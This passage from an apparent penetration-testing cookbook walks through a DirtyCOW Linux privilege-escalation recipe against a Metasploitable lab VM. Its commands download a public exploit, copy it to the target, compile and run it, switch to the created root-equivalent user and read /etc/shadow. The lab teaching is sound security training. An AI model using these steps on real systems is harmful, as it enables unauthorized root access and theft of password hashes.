<li>You will notice if you switch to the screen of the Metasploitable machine that it is shutting down:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="283" width="459" class="alignnone size-full wp-image-1254 image-border" src="assets/ab60c623-1cfd-4a9d-82c8-9bef522422be.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Metasploitable console: machine shutting down</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">DirtyCOW privilege escalation for Linux</h1>
                </header>
            
            <article>
                
<p>In this recipe, we will use DirtyCOW to exploit Linux.</p>
<p>We will use Metasploit with the DirtyCOW vulnerability to provide privilege escalation. <strong>Dirty Copy-On-Write</strong> (<span><strong>DirtyCOW</strong>) </span>was recently discovered and was a major vulnerability as it went for several years without being recognized and patched. DirtyCOW is a privilege escalation bug that exploits a race condition in the copy on write function. </p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali VM is up and running</li>
<li>Your Metasploitable VM is up and running and on the host-only network</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now launch DirtyCOW against a Linux machine:</p>
<ol>
<li>Open up a terminal window by clicking on the terminal icon: <img src="assets/7b4a48f1-4620-42af-99a4-0cb257600f28.png"/></li>
<li>Enter the following commands to download our DirtyCOW exploit:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd &lt;enter&gt;</strong><br/><strong>wget https://github.com/FireFart/dirtycow/raw/master/dirty.c &lt;enter&gt;</strong><br/><strong>nano dirty.c &lt;enter&gt;</strong></pre>
<ol start="3">
<li>From within nano, look for the section <kbd>struct Userinfo user;</kbd><strong> </strong>and change the <kbd>user.username</kbd> to <kbd>"dirtycow"</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="268" width="453" class="alignnone size-full wp-image-1255 image-border" src="assets/f5f7b4bb-f819-49b4-959a-964d101c1c8d.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">nano interface</div>
<ol start="4">
<li>Now we will send over the C code to our Metasploitable machine for compiling.</li>
</ol>
<div class="packt_infobox"><span>I will use the same username and password I created in a previous recipe, <em>Remote Linux privilege escalation</em>.</span></div>
<pre style="padding-left: 60px"><strong>cd &lt;enter&gt;</strong><br/><strong>scp ./dirty.c user7@192.168.56.105:dirty.c &lt;enter&gt;</strong><br/><strong>password &lt;enter&gt;</strong></pre>
<ol start="5">
<li>From your Kali VM, open an SSH session to your Metasploit VM as a standard user:</li>
</ol>
<pre style="padding-left: 60px"><strong>ssh user7@192.168.56.105 &lt;enter&gt;</strong><br/><strong>password &lt;enter&gt;</strong></pre>
<ol start="6">
<li>Let's compile our new exploit:</li>
</ol>
<pre style="padding-left: 60px"><strong>gcc -pthread dirty.c -o dirty -lcrypt &lt;enter&gt;</strong></pre>
<ol start="7">
<li>Now we will take a look at how we are before we launch the exploit:</li>
</ol>
<pre style="padding-left: 60px"><strong>whoami &lt;enter&gt;</strong><br/><strong>id &lt;enter&gt;</strong><br/><strong>cat /etc/shadow &lt;enter&gt;</strong><br/><strong>sudo /etc/shadow &lt;enter&gt;</strong><br/><strong>password &lt;enter&gt;</strong></pre>
<ol start="8">
<li>
<div class="CDPAlignLeft CDPAlign">You will notice I am a standard user and have no root privileges, nor am I a <kbd>sudo</kbd> user:</div>
</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img style="text-align: center;color: black;font-size: 1em" height="155" width="461" class="alignnone size-full wp-image-1256 image-border" src="assets/769e178d-ad15-449f-b87d-a61f05c21ba6.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Metasploitable machine output</div>
<ol start="9">
<li>Let's now run the <kbd>dirtycow</kbd> exploit:</li>
</ol>
<pre style="padding-left: 60px"><strong>./dirty &lt;enter&gt;</strong><br/><strong>dirtycow &lt;enter&gt;</strong></pre>
<div class="packt_tip packt_infobox">This will take several minutes to complete; be patient until you are back at the Command Prompt window.</div>
<div class="CDPAlignCenter CDPAlign"><img height="334" width="446" class="alignnone size-full wp-image-1257 image-border" src="assets/f09174df-7b58-4153-a526-f937f7b951bf.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Metasploitable: DirtyCOW exploit</div>
<ol start="10">
<li>Now let's see if we have a user we can <kbd>su</kbd> too:</li>
</ol>
<pre style="padding-left: 60px"><strong>su dirtycow </strong><br/><strong>dirtycow </strong><br/><strong>whoami </strong><br/><strong>id </strong><br/><strong>cat /etc/shadow</strong></pre>
<ol start="11">
<li>You will now see from the output that I am an elevated user and root equivalent:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="365" width="485" class="alignnone size-full wp-image-1258 image-border" src="assets/b99340e4-31ea-4c27-a335-6cafcbaa4812.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Metasploitable: elevated privileges output.</div>
<div class="packt_tip">Don't forget to restore your <kbd>/etc/passwd</kbd> file when finished by entering the following command: <kbd>mv /tmp/passwd.bak /etc/passwd</kbd>.</div>


            </article>

            
        </section>
    </body></html>